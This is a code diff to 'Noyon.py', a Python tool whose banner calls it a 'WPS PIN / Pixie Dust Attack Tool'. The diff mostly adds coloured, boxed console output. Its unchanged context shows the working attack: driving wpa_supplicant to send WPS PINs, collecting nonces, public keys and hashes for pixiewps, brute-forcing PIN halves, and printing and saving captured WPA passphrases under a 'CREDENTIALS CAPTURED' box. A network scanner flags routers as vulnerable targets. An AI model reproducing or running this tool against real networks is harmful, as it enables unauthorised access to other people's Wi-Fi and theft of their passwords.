@@ -34,6 +34,47 @@ except ImportError:
 
 
 # ═══════════════════════════════════════════════════════════════════
+#  PREMIUM COLOR PALETTE
+# ═══════════════════════════════════════════════════════════════════
+class C:
+    RESET     = '\033[0m'
+    BOLD      = '\033[1m'
+    DIM       = '\033[2m'
+    ITALIC    = '\033[3m'
+    UNDERLINE = '\033[4m'
+
+    BLACK     = '\033[30m'
+    RED       = '\033[91m'
+    GREEN     = '\033[92m'
+    YELLOW    = '\033[93m'
+    BLUE      = '\033[94m'
+    MAGENTA   = '\033[95m'
+    CYAN      = '\033[96m'
+    WHITE     = '\033[97m'
+
+    B_RED     = '\033[1;91m'
+    B_GREEN   = '\033[1;92m'
+    B_YELLOW  = '\033[1;93m'
+    B_BLUE    = '\033[1;94m'
+    B_MAGENTA = '\033[1;95m'
+    B_CYAN    = '\033[1;96m'
+    B_WHITE   = '\033[1;97m'
+
+    GOLD      = '\033[38;5;220m'
+    ORANGE    = '\033[38;5;208m'
+    PINK      = '\033[38;5;213m'
+    GRAY      = '\033[38;5;245m'
+    DARKGRAY  = '\033[38;5;240m'
+    BG_DARK   = '\033[48;5;236m'
+
+
+def clr(text, *styles):
+    """Apply multiple style codes to text."""
+    prefix = ''.join(styles)
+    return f'{prefix}{text}{C.RESET}'
+
+
+# ═══════════════════════════════════════════════════════════════════
 #  MAC ADDRESS HELPER
 # ═══════════════════════════════════════════════════════════════════
 class NetworkAddress:
@@ -477,8 +518,9 @@ class BruteforceStatus:
             percentage = int(self.mask) / 11000 * 100
         else:
             percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
-        print('[*] {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
-            percentage, self.start_time, average_pin_time))
+        print(f'{C.B_CYAN}[*]{C.RESET} {C.B_WHITE}{percentage:.2f}%{C.RESET} '
+              f'complete @ {C.GOLD}{self.start_time}{C.RESET} '
+              f'({C.YELLOW}{average_pin_time:.2f}s/pin{C.RESET})')
 
     def registerAttempt(self, mask):
         self.mask = mask
@@ -533,7 +575,7 @@ class Companion:
         self.generator = WPSpin()
 
     def __init_wpa_supplicant(self):
-        print('[*] Running wpa_supplicant…')
+        print(f'{C.B_CYAN}[*]{C.RESET} {C.WHITE}Starting wpa_supplicant…{C.RESET}')
         cmd = ('wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired '
                '-i{} -c{}').format(self.interface, self.tempconf)
         self.wpas = subprocess.Popen(cmd, shell=True,
@@ -561,9 +603,10 @@ class Companion:
     def _explain_wpas_not_ok_status(command, respond):
         if command.startswith(('WPS_REG', 'WPS_PBC')):
             if respond == 'UNKNOWN COMMAND':
-                return ('[!] wpa_supplicant appears to be compiled without WPS '
-                        'protocol support. Rebuild with CONFIG_WPS=y')
-        return '[!] Something went wrong — check out the debug log'
+                return (f'{C.B_RED}[!]{C.RESET} wpa_supplicant appears to be '
+                        f'compiled without WPS protocol support. '
+                        f'Rebuild with CONFIG_WPS=y')
+        return f'{C.B_RED}[!]{C.RESET} Something went wrong — check out the debug log'
 
     def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None, bssid=''):
         if not verbose:
@@ -581,41 +624,43 @@ class Companion:
             if 'Building Message M' in line:
                 n = int(line.split('Building Message M')[1].replace('D', ''))
                 self.connection_status.last_m_message = n
-                print('[*] Sending WPS Message M{}…'.format(n))
+                print(f'{C.B_CYAN}[*]{C.RESET} Sending WPS Message '
+                      f'{C.B_WHITE}M{n}{C.RESET}…')
             elif 'Received M' in line:
                 n = int(line.split('Received M')[1])
                 self.connection_status.last_m_message = n
-                print('[*] Received WPS Message M{}'.format(n))
+                print(f'{C.B_CYAN}[*]{C.RESET} Received WPS Message '
+                      f'{C.B_WHITE}M{n}{C.RESET}')
                 if n == 5:
-                    print('[+] The first half of the PIN is valid')
+                    print(f'{C.B_GREEN}[+]{C.RESET} The first half of the PIN is valid')
             elif 'Received WSC_NACK' in line:
                 self.connection_status.status = 'WSC_NACK'
-                print('[*] Received WSC NACK')
-                print('[-] Error: wrong PIN code')
+                print(f'{C.B_YELLOW}[*]{C.RESET} Received WSC NACK')
+                print(f'{C.B_RED}[-]{C.RESET} Error: wrong PIN code')
             elif 'Enrollee Nonce' in line and 'hexdump' in line:
                 self.pixie_creds.e_nonce = get_hex(line)
                 if pixiemode:
-                    print('[P] E-Nonce:', self.pixie_creds.e_nonce)
+                    print(f'{C.B_MAGENTA}[P]{C.RESET} E-Nonce: {C.GOLD}{self.pixie_creds.e_nonce}{C.RESET}')
             elif 'DH own Public Key' in line and 'hexdump' in line:
                 self.pixie_creds.pkr = get_hex(line)
                 if pixiemode:
-                    print('[P] PKR:', self.pixie_creds.pkr)
+                    print(f'{C.B_MAGENTA}[P]{C.RESET} PKR: {C.GOLD}{self.pixie_creds.pkr}{C.RESET}')
             elif 'DH peer Public Key' in line and 'hexdump' in line:
                 self.pixie_creds.pke = get_hex(line)
                 if pixiemode:
-                    print('[P] PKE:', self.pixie_creds.pke)
+                    print(f'{C.B_MAGENTA}[P]{C.RESET} PKE: {C.GOLD}{self.pixie_creds.pke}{C.RESET}')
             elif 'AuthKey' in line and 'hexdump' in line:
                 self.pixie_creds.authkey = get_hex(line)
                 if pixiemode:
-                    print('[P] AuthKey:', self.pixie_creds.authkey)
+                    print(f'{C.B_MAGENTA}[P]{C.RESET} AuthKey: {C.GOLD}{self.pixie_creds.authkey}{C.RESET}')
             elif 'E-Hash1' in line and 'hexdump' in line:
                 self.pixie_creds.e_hash1 = get_hex(line)
                 if pixiemode:
-                    print('[P] E-Hash1:', self.pixie_creds.e_hash1)
+                    print(f'{C.B_MAGENTA}[P]{C.RESET} E-Hash1: {C.GOLD}{self.pixie_creds.e_hash1}{C.RESET}')
             elif 'E-Hash2' in line and 'hexdump' in line:
                 self.pixie_creds.e_hash2 = get_hex(line)
                 if pixiemode:
-                    print('[P] E-Hash2:', self.pixie_creds.e_hash2)
+                    print(f'{C.B_MAGENTA}[P]{C.RESET} E-Hash2: {C.GOLD}{self.pixie_creds.e_hash2}{C.RESET}')
             elif 'Network Key' in line and 'hexdump' in line:
                 self.connection_status.status = 'GOT_PSK'
                 self.connection_status.wpa_psk = (
@@ -624,49 +669,51 @@ class Companion:
         elif ': State: ' in line:
             if '-> SCANNING' in line:
                 self.connection_status.status = 'scanning'
-                print('[*] Scanning…')
+                print(f'{C.B_CYAN}[*]{C.RESET} Scanning…')
         elif 'WPS-FAIL' in line and self.connection_status.status:
             self.connection_status.status = 'WPS_FAIL'
-            print('[-] wpa_supplicant returned WPS-FAIL')
+            print(f'{C.B_RED}[-]{C.RESET} wpa_supplicant returned WPS-FAIL')
         elif 'Trying to authenticate with' in line:
             self.connection_status.status = 'authenticating'
             if 'SSID' in line:
                 self.connection_status.essid = self.__decode_ssid(line)
-            print('[*] Authenticating…')
+            print(f'{C.B_CYAN}[*]{C.RESET} Authenticating…')
         elif 'Authentication response' in line:
-            print('[+] Authenticated')
+            print(f'{C.B_GREEN}[+]{C.RESET} Authenticated')
         elif 'Trying to associate with' in line:
             self.connection_status.status = 'associating'
             if 'SSID' in line:
                 self.connection_status.essid = self.__decode_ssid(line)
-            print('[*] Associating with AP…')
+            print(f'{C.B_CYAN}[*]{C.RESET} Associating with AP…')
         elif 'Associated with' in line and self.interface in line:
             bssid_target = line.split()[-1].upper()
             if self.connection_status.essid:
-                print('[+] Associated with {} (ESSID: {})'.format(
-                    bssid_target, self.connection_status.essid))
+                print(f'{C.B_GREEN}[+]{C.RESET} Associated with '
+                      f'{C.B_WHITE}{bssid_target}{C.RESET} '
+                      f'(ESSID: {C.GOLD}{self.connection_status.essid}{C.RESET})')
             else:
-                print('[+] Associated with {}'.format(bssid_target))
+                print(f'{C.B_GREEN}[+]{C.RESET} Associated with '
+                      f'{C.B_WHITE}{bssid_target}{C.RESET}')
         elif 'EAPOL: txStart' in line:
             self.connection_status.status = 'eapol_start'
-            print('[*] Sending EAPOL Start…')
+            print(f'{C.B_CYAN}[*]{C.RESET} Sending EAPOL Start…')
         elif 'EAP entering state IDENTITY' in line:
-            print('[*] Received Identity Request')
+            print(f'{C.B_CYAN}[*]{C.RESET} Received Identity Request')
         elif 'using real identity' in line:
-            print('[*] Sending Identity Response…')
+            print(f'{C.B_CYAN}[*]{C.RESET} Sending Identity Response…')
         elif bssid and bssid in line and 'level=' in line:
             signal = line.split("level=")[1].split(" ")[0]
             self.lastPwr = signal
             if verbose:
                 if 'noise=' in line:
                     noise = line.split("noise=")[1].split(" ")[0]
-                    print(f'[i] Current signal: {signal}, noise: {noise}')
+                    print(f'{C.DIM}[i] Current signal: {signal}, noise: {noise}{C.RESET}')
                 else:
-                    print(f'[i] Current signal: {signal}')
+                    print(f'{C.DIM}[i] Current signal: {signal}{C.RESET}')
         elif pbc_mode and ('selected BSS ' in line):
             bssid_target = line.split('selected BSS ')[-1].split()[0].upper()
             self.connection_status.bssid = bssid_target
-            print('[*] Selected AP: {}'.format(bssid_target))
+            print(f'{C.B_CYAN}[*]{C.RESET} Selected AP: {C.B_WHITE}{bssid_target}{C.RESET}')
         return True
 
     @staticmethod
@@ -679,10 +726,10 @@ class Companion:
             return ''
 
     def __runPixiewps(self, showcmd=False, full_range=False):
-        print('[*] Running Pixiewps…')
+        print(f'{C.B_CYAN}[*]{C.RESET} Running Pixiewps…')
         cmd = self.pixie_creds.get_pixie_cmd(full_range)
         if showcmd:
-            print(cmd)
+            print(f'{C.DIM}{cmd}{C.RESET}')
         r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                            stderr=sys.stdout, encoding='utf-8', errors='replace')
         print(r.stdout)
@@ -694,9 +741,15 @@ class Companion:
         return False
 
     def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
-        print(f"[+] WPS PIN: '{wps_pin}'")
-        print(f"[+] WPA PSK: '{wpa_psk}'")
-        print(f"[+] AP SSID: '{essid}'")
+        print()
+        print(f'{C.B_GREEN}╔══════════════════════════════════════════════════════╗{C.RESET}')
+        print(f'{C.B_GREEN}║{C.RESET}  {C.B_YELLOW}★ CREDENTIALS CAPTURED ★{C.RESET}                            {C.B_GREEN}║{C.RESET}')
+        print(f'{C.B_GREEN}╠══════════════════════════════════════════════════════╣{C.RESET}')
+        print(f'{C.B_GREEN}║{C.RESET}  {C.BOLD}WPS PIN {C.RESET}: {C.B_GREEN}{wps_pin}{C.RESET}')
+        print(f'{C.B_GREEN}║{C.RESET}  {C.BOLD}WPA PSK {C.RESET}: {C.B_GREEN}{wpa_psk}{C.RESET}')
+        print(f'{C.B_GREEN}║{C.RESET}  {C.BOLD}AP SSID {C.RESET}: {C.B_GREEN}{essid}{C.RESET}')
+        print(f'{C.B_GREEN}╚══════════════════════════════════════════════════════╝{C.RESET}')
+        print()
 
     def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
         os.makedirs(self.reports_dir, exist_ok=True)
@@ -730,34 +783,42 @@ class Companion:
         with open(json_file, 'w', encoding='utf-8') as jf:
             json.dump(data, jf, indent=4)
 
-        print(f'[i] Credentials saved to {filename}.txt, {filename}.csv, '
-              f'and {filename}.json')
+        print(f'{C.B_CYAN}[i]{C.RESET} Credentials saved to '
+              f'{C.GOLD}{filename}.txt{C.RESET}, '
+              f'{C.GOLD}{filename}.csv{C.RESET}, and '
+              f'{C.GOLD}{filename}.json{C.RESET}')
 
     def __savePin(self, bssid, pin):
         filename = self.pixiewps_dir + '{}.run'.format(
             bssid.replace(':', '').upper())
         with open(filename, 'w') as f:
             f.write(pin)
-        print(f'[i] PIN saved in {filename}')
+        print(f'{C.B_CYAN}[i]{C.RESET} PIN saved in {C.GOLD}{filename}{C.RESET}')
 
     def __prompt_wpspin(self, bssid):
         pins = self.generator.getSuggested(bssid)
         if len(pins) > 1:
-            print(f'PINs generated for {bssid}:')
-            print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
+            print()
+            print(f'{C.B_CYAN}╭─ {C.B_WHITE}PINs generated for {bssid}{C.RESET}')
+            print(f'{C.B_CYAN}│{C.RESET}')
+            print(f'{C.B_CYAN}│{C.RESET}  {C.BOLD}{"#":<5}{"PIN":<12}{"Name"}{C.RESET}')
+            print(f'{C.B_CYAN}│{C.RESET}  {C.DIM}{"─"*45}{C.RESET}')
             for i, pin in enumerate(pins):
-                print('{:<3} {:<10} {:<}'.format(
-                    f'{i + 1})', pin['pin'], pin['name']))
+                num = f'{i + 1})'
+                print(f'{C.B_CYAN}│{C.RESET}  {C.B_RED}{num:<5}{C.RESET}'
+                      f'{C.B_GREEN}{pin["pin"]:<12}{C.RESET}{pin["name"]}')
+            print(f'{C.B_CYAN}╰─────────────────────────────────────────{C.RESET}')
             while True:
-                pinNo = input('Select the PIN: ')
+                pinNo = input(f'{C.B_CYAN}└─▶{C.RESET} Select the PIN: ')
                 try:
                     if int(pinNo) in range(1, len(pins) + 1):
                         return pins[int(pinNo) - 1]['pin']
                 except Exception:
                     pass
-                print('Invalid number')
+                print(f'{C.B_RED}[!]{C.RESET} Invalid number')
         elif len(pins) == 1:
-            print('[i] The only probable PIN is selected:', pins[0]['name'])
+            print(f'{C.B_CYAN}[i]{C.RESET} The only probable PIN is selected: '
+                  f'{C.GOLD}{pins[0]["name"]}{C.RESET}')
             return pins[0]['pin']
         return None
 
@@ -778,13 +839,14 @@ class Companion:
 
         if pbc_mode:
             if bssid:
-                print(f'[*] Starting WPS push button connection to {bssid}…')
+                print(f'{C.B_CYAN}[*]{C.RESET} Starting WPS push button connection to '
+                      f'{C.B_WHITE}{bssid}{C.RESET}…')
                 cmd = f'WPS_PBC {bssid}'
             else:
-                print('[*] Starting WPS push button connection…')
+                print(f'{C.B_CYAN}[*]{C.RESET} Starting WPS push button connection…')
                 cmd = 'WPS_PBC'
         else:
-            print(f"[*] Trying PIN '{pin}'…")
+            print(f'{C.B_CYAN}[*]{C.RESET} Trying PIN {C.B_GREEN}{pin}{C.RESET}…')
             cmd = f'WPS_REG {bssid} {pin}'
 
         r = self.sendAndReceive(cmd)
@@ -815,8 +877,8 @@ class Companion:
                         bssid.replace(':', '').upper())
                     with open(filename, 'r') as f:
                         t_pin = f.readline().strip()
-                    if input(f'[?] Use previously calculated PIN {t_pin}? [n/Y] '
-                             ).lower() != 'n':
+                    if input(f'{C.B_YELLOW}[?]{C.RESET} Use previously calculated PIN '
+                             f'{C.B_GREEN}{t_pin}{C.RESET}? [n/Y] ').lower() != 'n':
                         pin = t_pin
                     else:
                         raise FileNotFoundError
@@ -833,7 +895,7 @@ class Companion:
             try:
                 self.__wps_connection(bssid, pin, pixiemode)
             except KeyboardInterrupt:
-                print('\nAborting…')
+                print(f'\n{C.B_YELLOW}Aborting…{C.RESET}')
                 self.__savePin(bssid, pin)
                 return False
         else:
@@ -859,7 +921,7 @@ class Companion:
                     return self.single_connection(bssid, pin, pixiemode=False,
                                                   store_pin_on_fail=True)
                 return False
-            print('[!] Not enough data to run Pixie Dust attack')
+            print(f'{C.B_RED}[!]{C.RESET} Not enough data to run Pixie Dust attack')
             return False
         else:
             if store_pin_on_fail:
@@ -873,16 +935,16 @@ class Companion:
             pin = '{}000{}'.format(f_half, checksum(t))
             self.single_connection(bssid, pin)
             if self.connection_status.isFirstHalfValid():
-                print('[+] First half found')
+                print(f'{C.B_GREEN}[+]{C.RESET} First half found')
                 return f_half
             elif self.connection_status.status == 'WPS_FAIL':
-                print('[!] WPS transaction failed, re-trying last pin')
+                print(f'{C.B_YELLOW}[!]{C.RESET} WPS transaction failed, re-trying last pin')
                 return self.__first_half_bruteforce(bssid, f_half)
             f_half = str(int(f_half) + 1).zfill(4)
             self.bruteforce.registerAttempt(f_half)
             if delay:
                 time.sleep(delay)
-        print('[-] First half not found')
+        print(f'{C.B_RED}[-]{C.RESET} First half not found')
         return False
 
     def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
@@ -894,7 +956,7 @@ class Companion:
             if self.connection_status.last_m_message > 6:
                 return pin
             elif self.connection_status.status == 'WPS_FAIL':
-                print('[!] WPS transaction failed, re-trying last pin')
+                print(f'{C.B_YELLOW}[!]{C.RESET} WPS transaction failed, re-trying last pin')
                 return self.__second_half_bruteforce(bssid, f_half, s_half)
             s_half = str(int(s_half) + 1).zfill(3)
             self.bruteforce.registerAttempt(f_half + s_half)
@@ -908,8 +970,8 @@ class Companion:
                 filename = self.sessions_dir + '{}.run'.format(
                     bssid.replace(':', '').upper())
                 with open(filename, 'r') as f:
-                    if input(f'[?] Restore previous session for {bssid}? [n/Y] '
-                             ).lower() != 'n':
+                    if input(f'{C.B_YELLOW}[?]{C.RESET} Restore previous session for '
+                             f'{C.B_WHITE}{bssid}{C.RESET}? [n/Y] ').lower() != 'n':
                         mask = f.readline().strip()
                     else:
                         raise FileNotFoundError
@@ -929,12 +991,12 @@ class Companion:
                 self.__second_half_bruteforce(bssid, mask[:4], mask[4:], delay)
             raise KeyboardInterrupt
         except KeyboardInterrupt:
-            print('\nAborting…')
+            print(f'\n{C.B_YELLOW}Aborting…{C.RESET}')
             filename = self.sessions_dir + '{}.run'.format(
                 bssid.replace(':', '').upper())
             with open(filename, 'w') as f:
                 f.write(self.bruteforce.mask)
-            print(f'[i] Session saved in {filename}')
+            print(f'{C.B_CYAN}[i]{C.RESET} Session saved in {C.GOLD}{filename}{C.RESET}')
             if self.loop_mode:
                 raise
 
@@ -962,9 +1024,11 @@ class Companion:
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  WIFI SCANNER
+#  WIFI SCANNER  (PREMIUM UI)
 # ═══════════════════════════════════════════════════════════════════
 class WiFiScanner:
+    LINE_WIDTH = 62
+
     def __init__(self, interface, vuln_list=None, reverse_scan=False):
         self.interface = interface
         self.vuln_list = vuln_list
@@ -1032,7 +1096,7 @@ class WiFiScanner:
                               stderr=subprocess.STDOUT, encoding='utf-8',
                               errors='replace')
         if proc.returncode != 0:
-            print('[!] iw scan failed:',
+            print(f'{C.B_RED}[!]{C.RESET} iw scan failed:',
                   (proc.stdout or '').splitlines()[:1])
             return False
 
@@ -1053,7 +1117,7 @@ class WiFiScanner:
 
         for line in proc.stdout.splitlines():
             if line.startswith('command failed:'):
-                print('[!] Error:', line)
+                print(f'{C.B_RED}[!]{C.RESET} Error:', line)
                 return False
             line = line.strip('\t')
             for regexp, handler in matchers.items():
@@ -1068,48 +1132,81 @@ class WiFiScanner:
         networks.sort(key=lambda x: x['Level'], reverse=True)
         network_list = {(i + 1): n for i, n in enumerate(networks)}
 
-        def colored(text, color=None):
-            codes = {'green': '\033[92m', 'red': '\033[91m',
-                     'yellow': '\033[93m'}
-            if color in codes:
-                return f'{codes[color]}{text}\033[00m'
-            return text
-
+        # ─────────────────────────────────────────────
+        #  PREMIUM HEADER
+        # ─────────────────────────────────────────────
+        W = self.LINE_WIDTH
+        print()
+        print(f'{C.B_CYAN}╔{"═" * W}╗{C.RESET}')
+        title = '📶  AVAILABLE WPS NETWORKS'
+        pad = (W - _str_width(title) - 2) // 2
+        print(f'{C.B_CYAN}║{C.RESET}{" " * pad}{C.B_WHITE}{C.BOLD}{title}{C.RESET}'
+              f'{" " * (W - pad - _str_width(title) - 2)}{C.B_CYAN}║{C.RESET}')
+        print(f'{C.B_CYAN}╠{"═" * W}╣{C.RESET}')
+        total = len(networks)
+        print(f'{C.B_CYAN}║{C.RESET}  {C.GRAY}Found {C.B_WHITE}{total}{C.RESET} '
+              f'{C.GRAY}WPS-enabled network(s){C.RESET}'
+              f'{" " * (W - 33)}{C.B_CYAN}║{C.RESET}')
         if self.vuln_list:
-            print('Network marks: {1} {0} {2} {0} {3}'.format(
-                '|',
-                colored('Possibly vulnerable', 'green'),
-                colored('WPS locked', 'red'),
-                colored('Already stored', 'yellow')))
-        print('Networks list:')
-        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
-            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))
+            print(f'{C.B_CYAN}║{C.RESET}  {C.B_GREEN}● {C.RESET}{C.GRAY}Possibly vulnerable   '
+                  f'{C.B_RED}● {C.RESET}{C.GRAY}WPS locked   '
+                  f'{C.B_YELLOW}● {C.RESET}{C.GRAY}Already stored{C.RESET}'
+                  f'{" " * (W - 55)}{C.B_CYAN}║{C.RESET}')
+        print(f'{C.B_CYAN}╚{"═" * W}╝{C.RESET}')
 
         items = list(network_list.items())
         if self.reverse_scan:
             items = items[::-1]
-        for n, network in items:
-            model = '{} {}'.format(network['Model'], network['Model number'])
-            essid = truncate(network.get('ESSID', 'HIDDEN'), 25)
-            device = truncate(network['Device name'], 27)
-            line = ' '.join([
-                truncate(f'{n})', 4),
-                truncate(network['BSSID'], 18),
-                essid,
-                truncate(network['Security type'], 8),
-                truncate(str(network['Level']), 4),
-                device,
-                model,
-            ])
-            if (network['BSSID'], network.get('ESSID', 'HIDDEN')) in self.stored:
-                print(colored(line, 'yellow'))
-            elif network['WPS locked']:
-                print(colored(line, 'red'))
-            elif self.vuln_list and (model in self.vuln_list):
-                print(colored(line, 'green'))
-            else:
-                print(line)
 
+        # ─────────────────────────────────────────────
+        #  PREMIUM NETWORK CARDS
+        # ─────────────────────────────────────────────
+        for n, network in items:
+            model = '{} {}'.format(network['Model'],
+                                   network['Model number']).strip()
+            essid = network.get('ESSID', 'HIDDEN')
+
+            # Determine category
+            if (network['BSSID'], essid) in self.stored:
+                accent = C.B_YELLOW
+                tag = f'{C.B_YELLOW}★ STORED{C.RESET}'
+            elif network['WPS locked']:
+                accent = C.B_RED
+                tag = f'{C.B_RED}🔒 LOCKED{C.RESET}'
+            elif self.vuln_list and (model in self.vuln_list):
+                accent = C.B_GREEN
+                tag = f'{C.B_GREEN}⚡ VULNERABLE{C.RESET}'
+            else:
+                accent = C.B_CYAN
+                tag = ''
+
+            # Red big number
+            print()
+            print(f'  {C.B_RED}▌{C.RESET} {C.B_RED}{C.BOLD}{n}{C.RESET}'
+                  + (f'   {tag}' if tag else ''))
+            # Double separator (top)
+            print(f'  {accent}{"━" * W}{C.RESET}')
+
+            # Info rows
+            label_w = 10
+            def row(label, value, color=C.WHITE):
+                label_str = f'{label:<{label_w}}'
+                print(f'  {C.DARKGRAY}│{C.RESET}  '
+                      f'{C.BOLD}{label_str}{C.RESET}: {color}{value}{C.RESET}')
+
+            row('BSSID', network['BSSID'], C.B_CYAN)
+            row('ESSID', essid, C.B_WHITE)
+            row('Security', network['Security type'], C.GOLD)
+            row('Signal', f'{network["Level"]} dBm', C.B_GREEN
+                if network['Level'] > -60 else C.B_YELLOW)
+            if network['Device name'] or model:
+                dev = f'{network["Device name"]} {model}'.strip()
+                row('Device', dev, C.GRAY)
+
+            # Double separator (bottom)
+            print(f'  {accent}{"━" * W}{C.RESET}')
+
+        print()
         return network_list
 
     @staticmethod
@@ -1120,18 +1217,23 @@ class WiFiScanner:
     def prompt_network(self) -> str:
         networks = self.iw_scanner()
         if not networks:
-            print('[-] No WPS networks found.')
+            print(f'{C.B_RED}[-]{C.RESET} No WPS networks found.')
             return ''
         while True:
             try:
-                networkNo = input('Select target (press Enter to refresh): ')
+                networkNo = input(
+                    f'\n{C.B_CYAN}┌─[{C.RESET}{C.B_WHITE}Select Target{C.RESET}'
+                    f'{C.B_CYAN}]{C.RESET}\n'
+                    f'{C.B_CYAN}└─▶{C.RESET} '
+                    f'{C.GRAY}(Enter to refresh){C.RESET}: '
+                )
                 if networkNo.lower() in ('r', '0', ''):
                     return self.prompt_network()
                 if int(networkNo) in networks.keys():
                     return networks[int(networkNo)]['BSSID']
                 raise IndexError
             except Exception:
-                print('Invalid number')
+                print(f'{C.B_RED}[!]{C.RESET} Invalid number')
 
 
 # ═══════════════════════════════════════════════════════════════════
@@ -1145,21 +1247,39 @@ def ifaceUp(iface, down=False):
 
 
 def die(msg):
-    sys.stderr.write(msg + '\n')
+    sys.stderr.write(f'{C.B_RED}[✘]{C.RESET} {msg}\n')
     sys.exit(1)
 
 
 def show_banner():
+    print()
+    # ASCII banner
     if Figlet:
         try:
-            print(Figlet(font='slant').renderText('NOYON'))
+            banner = Figlet(font='slant').renderText('NOYON')
+            print(f'{C.B_CYAN}{banner}{C.RESET}')
         except Exception:
             pass
-    print('═══════════════════════════════════════════════════════')
-    print('  Noyon.py — WPS PIN / Pixie Dust Attack Tool')
-    print('  Author: Noyon')
-    print('  Based on: rofl0r & drygdryg (OneShotPin)')
-    print('═══════════════════════════════════════════════════════')
+    else:
+        print(f'{C.B_CYAN}{C.BOLD}  N O Y O N{C.RESET}')
+
+    W = 58
+    print(f'{C.GOLD}╔{"═" * W}╗{C.RESET}')
+    print(f'{C.GOLD}║{C.RESET}  {C.B_WHITE}{C.BOLD}NOYON.py{C.RESET} '
+          f'{C.DIM}— WPS PIN / Pixie Dust Attack Tool{C.RESET}'
+          f'{" " * 8}{C.GOLD}║{C.RESET}')
+    print(f'{C.GOLD}╟{"─" * W}╢{C.RESET}')
+    print(f'{C.GOLD}║{C.RESET}  {C.GRAY}Author     {C.RESET}: '
+          f'{C.B_GREEN}Noyon{C.RESET}'
+          f'{" " * (W - 17)}{C.GOLD}║{C.RESET}')
+    print(f'{C.GOLD}║{C.RESET}  {C.GRAY}Based on   {C.RESET}: '
+          f'{C.WHITE}rofl0r & drygdryg (OneShotPin){C.RESET}'
+          f'{" " * (W - 36)}{C.GOLD}║{C.RESET}')
+    print(f'{C.GOLD}║{C.RESET}  {C.GRAY}Version    {C.RESET}: '
+          f'{C.B_YELLOW}Premium Edition{C.RESET}'
+          f'{" " * (W - 25)}{C.GOLD}║{C.RESET}')
+    print(f'{C.GOLD}╚{"═" * W}╝{C.RESET}')
+    print()
 
 
 # ═══════════════════════════════════════════════════════════════════
@@ -1241,8 +1361,9 @@ if __name__ == '__main__':
                     scanner = WiFiScanner(args.interface, vuln_list,
                                           reverse_scan=args.reverse_scan)
                     if not args.loop:
-                        print('[*] BSSID not specified (--bssid) — scanning '
-                              'for available networks')
+                        print(f'{C.B_CYAN}[*]{C.RESET} BSSID not specified '
+                              f'({C.GOLD}--bssid{C.RESET}) — '
+                              f'scanning for available networks')
                     args.bssid = scanner.prompt_network()
 
                 if args.bssid:
@@ -1263,12 +1384,13 @@ if __name__ == '__main__':
             args.bssid = None
         except KeyboardInterrupt:
             if args.loop:
-                if input('\n[?] Exit the script? [N/y] ').lower() == 'y':
-                    print('Aborting…')
+                if input(f'\n{C.B_YELLOW}[?]{C.RESET} Exit the script? [N/y] '
+                         ).lower() == 'y':
+                    print(f'{C.B_YELLOW}Aborting…{C.RESET}')
                     break
                 args.bssid = None
             else:
-                print('\nAborting…')
+                print(f'\n{C.B_YELLOW}Aborting…{C.RESET}')
                 break
 
     if companion is not None:
